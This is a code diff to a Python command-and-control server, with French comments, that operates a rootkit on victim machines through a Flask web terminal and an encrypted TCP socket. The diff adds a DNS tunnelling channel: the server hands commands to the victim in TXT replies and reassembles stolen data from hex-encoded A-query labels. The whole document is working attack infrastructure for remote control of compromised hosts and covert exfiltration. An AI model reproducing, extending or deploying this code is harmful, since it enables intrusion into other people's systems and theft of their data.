@@ -1,4 +1,3 @@
-# attacking_program.py
 import socket
 import threading
 import subprocess
@@ -7,6 +6,8 @@ import time
 import getpass
 import sys
 import os
+import time
+import binascii, socketserver
 from flask import Flask, request, render_template, redirect, url_for, flash, send_file
 from werkzeug.utils import secure_filename
 from prompt_toolkit import PromptSession
@@ -14,6 +15,7 @@ from prompt_toolkit.patch_stdout import patch_stdout
 from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from cryptography.hazmat.backends import default_backend
 from cryptography.hazmat.primitives import padding
+from dnslib import DNSRecord, QTYPE, RR, A, TXT, EDNS0
 
 # -------------------- CONFIGURATION --------------------
 HOST = '0.0.0.0'
@@ -25,6 +27,16 @@ DOWNLOAD_FOLDER = "downloads"
 
 AES_KEY = b'1234567890abcdef'  # 16 bytes = 128 bits
 AES_IV = b'abcdef1234567890'   # 16 bytes = 128 bits
+
+# ------------------------ DNS --------------------------
+DNS_PORT = 53
+DNS_DOMAIN = "dns.google.com"
+DNS_RESPONSE_TIMEOUT = 12.0
+DNS_POLL_INTERVAL   = 0.2 
+command_queue = []
+exfil_buffer = {}
+last_channel = 'tcp'
+expected_chunks = None
 
 # -------------------- FLASK SETUP ----------------------
 app = Flask(__name__)
@@ -70,7 +82,7 @@ def dashboard():
 def terminal():
     if not authenticated:
         return redirect(url_for('login'))
-    return render_template("terminal.html", response=last_response, history=command_history)
+    return render_template("terminal.html", response=last_response, history=command_history, last_channel=last_channel)
 
 @app.route('/shell_remote', methods=['GET', 'POST'])
 def shell_remote():
@@ -152,12 +164,44 @@ def download_file(filename):
         return redirect(url_for('login'))
     return send_file(os.path.join(DOWNLOAD_FOLDER, filename), as_attachment=True)
 
+def assemble_exfil(timeout=DNS_RESPONSE_TIMEOUT, poll=DNS_POLL_INTERVAL):
+    """
+    Wait up to `timeout` seconds for all expected_chunks to arrive,
+    polling exfil_buffer every `poll` seconds. Returns the assembled
+    text (or empty string on timeout).
+    """
+    global expected_chunks, exfil_buffer
+
+    start = time.time()
+    
+    # Wait until we know how many chunks AND have them all, or timeout
+    while True:
+        if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
+            break
+        if time.time() - start > timeout:
+            break
+        time.sleep(poll)
+
+    if expected_chunks is not None and len(exfil_buffer) >= expected_chunks:
+        data = b''.join(exfil_buffer[i] for i in range(expected_chunks))
+        text = data.decode(errors='ignore')
+    else:
+        text = ""
+
+    # Reset the buffer and expected chunks, for next command
+    expected_chunks = None
+    exfil_buffer.clear()
+    return text
+
 @app.route('/send', methods=['POST'])
 def send():
+    global last_channel
     global last_response
     if not authenticated:
         return redirect(url_for('login'))
 
+    channel = request.form.get('channel','tcp')
+    last_channel = channel 
     cmd = request.form.get('command', '').strip()
     if not cmd:
         return redirect(url_for('terminal'))
@@ -166,60 +210,74 @@ def send():
     command_entry = {"command": cmd, "stdout": "", "stderr": ""}
     command_history.append(command_entry)
 
-    try:
-        with connection_lock:
-            send_to_server(rootkit_connection, cmd)
-            if 'killcom' in cmd.lower():
-                rootkit_connection.close()
-                last_response = {"stdout": "", "stderr": "Connexion terminée."}
-                return redirect(url_for('dashboard'))
+    if channel == 'dns':
+        command_queue.append(cmd)
+        last_response = {"stdout": "", "stderr": "⏳ Queued via DNS"}
 
-            rootkit_connection.settimeout(3)
-            try:
-                chunks = []
-                rootkit_connection.settimeout(1)
-                while True:
-                    try:
-                        part = receive_from_server(rootkit_connection)
-                        print(part)
-                        if not part:
+        out = assemble_exfil()
+
+        if out:
+            last_response = {"stdout": out, "stderr": ""}
+            command_entry["stdout"] = out
+        else:
+            last_response = {"stdout": "", "stderr": "⚠️ no DNS response"}
+            command_entry["stderr"] = last_response["stderr"]
+
+    else:
+        try:
+            with connection_lock:
+                send_to_server(rootkit_connection, cmd)
+                if 'killcom' in cmd.lower():
+                    rootkit_connection.close()
+                    last_response = {"stdout": "", "stderr": "Connexion terminée."}
+                    return redirect(url_for('dashboard'))
+
+                rootkit_connection.settimeout(3)
+                try:
+                    chunks = []
+                    rootkit_connection.settimeout(1)
+                    while True:
+                        try:
+                            part = receive_from_server(rootkit_connection)
+                            print(part)
+                            if not part:
+                                break
+                            chunks.append(part)
+                        except socket.timeout:
                             break
-                        chunks.append(part)
-                    except socket.timeout:
-                        break
-                response = ''.join(chunks)
+                    response = ''.join(chunks)
 
-                stdout_marker = "stdout:"
-                stderr_marker = "stderr:"
+                    stdout_marker = "stdout:"
+                    stderr_marker = "stderr:"
 
-                if stdout_marker in response and stderr_marker in response:
-                    start_stdout = response.index(stdout_marker) + len(stdout_marker)
-                    start_stderr = response.index(stderr_marker) + len(stderr_marker)
+                    if stdout_marker in response and stderr_marker in response:
+                        start_stdout = response.index(stdout_marker) + len(stdout_marker)
+                        start_stderr = response.index(stderr_marker) + len(stderr_marker)
 
-                    stdout_content = response[start_stdout:response.index(stderr_marker)].strip()
-                    stderr_content = response[start_stderr:].strip()
+                        stdout_content = response[start_stdout:response.index(stderr_marker)].strip()
+                        stderr_content = response[start_stderr:].strip()
 
-                    last_response = {
-                        "stdout": stdout_content, 
-                        "stderr": stderr_content
-                    }
+                        last_response = {
+                            "stdout": stdout_content, 
+                            "stderr": stderr_content
+                        }
 
-                    # Enregistrer la sortie dans l'historique
-                    command_entry["stdout"] = stdout_content
-                    command_entry["stderr"] = stderr_content
+                        # Enregistrer la sortie dans l'historique
+                        command_entry["stdout"] = stdout_content
+                        command_entry["stderr"] = stderr_content
 
-                else:
-                    last_response = {"stdout": response.strip(), "stderr": ""}
-                    command_entry["stdout"] = response.strip()
-                    command_entry["stderr"] = ""
+                    else:
+                        last_response = {"stdout": response.strip(), "stderr": ""}
+                        command_entry["stdout"] = response.strip()
+                        command_entry["stderr"] = ""
 
-            except socket.timeout:
-                last_response = {"stdout": "", "stderr": "⏱️ Le rootkit n'a pas répondu à temps."}
-            finally:
-                rootkit_connection.settimeout(None)
+                except socket.timeout:
+                    last_response = {"stdout": "", "stderr": "⏱️ Le rootkit n'a pas répondu à temps."}
+                finally:
+                    rootkit_connection.settimeout(None)
 
-    except Exception as e:
-        last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}
+        except Exception as e:
+            last_response = {"stdout": "", "stderr": f"💥 Erreur : {e}"}
 
     return redirect(url_for('terminal'))
 
@@ -382,6 +440,61 @@ def receive_from_server(sock):
 
     return decrypted
 
+# ----------------------- DNS THREAD ------------------------
+class DNSHandler(socketserver.BaseRequestHandler):
+    def handle(self):
+        data, sock = self.request
+        global expected_chunks, exfil_buffer
+        try:
+            req   = DNSRecord.parse(data)
+            qname = str(req.q.qname).rstrip('.')
+            qtype = QTYPE[req.q.qtype]
+        except Exception as e:
+            print(f"❌ [dns] parse error: {e}")
+            return
+        reply = req.reply()
+       
+        # Victim pulling commands via TXT
+        if qtype == "TXT" and qname == f"command.{DNS_DOMAIN}":
+            if command_queue:
+                cmd = command_queue.pop(0)
+                print(f"📤 [dns-cmd] sending: {cmd!r}")
+                reply.add_answer(RR(qname, QTYPE.TXT, rdata=TXT(cmd), ttl=0))
+            try:
+                sock.sendto(reply.pack(), self.client_address)
+            except Exception as e:
+                print(f"❌ [dns] failed to send TXT reply: {e}")
+            return
+
+        # Victim exfiltrating via A-queries
+        if qtype == "A":
+            label = qname.split('.', 1)[0]
+            if '-' in label and '/' in label:
+                hdr, hx = label.split('-', 1)
+                seq_s, tot_s = hdr.split('/', 1)
+                try:
+                    seq = int(seq_s, 16)
+                    tot = int(tot_s, 16)
+                    chunk = binascii.unhexlify(hx)
+                    exfil_buffer[seq] = chunk
+
+                    # On the first chunk, remember how many we expect
+                    if expected_chunks is None:
+                        expected_chunks = tot
+                    print(f"📥 [dns-exfil] got chunk {seq}/{tot}")
+                except Exception as e:
+                    print(f"⚠️ parse error on label {label}: {e}")
+
+            # Reply harmlessly so the kernel unblocks
+            reply.add_answer(RR(qname, QTYPE.A, rdata=A("127.0.0.1"), ttl=0))
+            sock.sendto(reply.pack(), self.client_address)
+
+
+def start_dns_server():
+    server = socketserver.ThreadingUDPServer(('0.0.0.0', DNS_PORT), DNSHandler)
+    threading.Thread(target=server.serve_forever, daemon=True).start()
+    print(f"🚧 DNS server listening on UDP/53 for domain {DNS_DOMAIN}")
+
 # ---------------------- SOCKET THREAD ----------------------
 def socket_listener():
     global rootkit_connection, rootkit_address
@@ -486,6 +599,7 @@ def run_cli():
     server_socket.close()
     print("🔒 Connexion fermée.")
 
+
 # ---------------------- MAIN MENU ----------------------
 def main():
     print("""
@@ -494,10 +608,14 @@ def main():
 2. 🌐 Mode Web
 3. 🧪 Mode Application (à venir)
 """)
+    ####################################################################
+    # CLI is BAD, need to correct and to adapt with DNS and all commands
+    ####################################################################
     choix = input("Choix du mode (1/2/3) > ").strip()
     if choix == '1':
         run_cli()
     elif choix == '2':
+        start_dns_server()
         threading.Thread(target=socket_listener, daemon=True).start()
         app.run(host='0.0.0.0', port=5000)
     elif choix == '3':
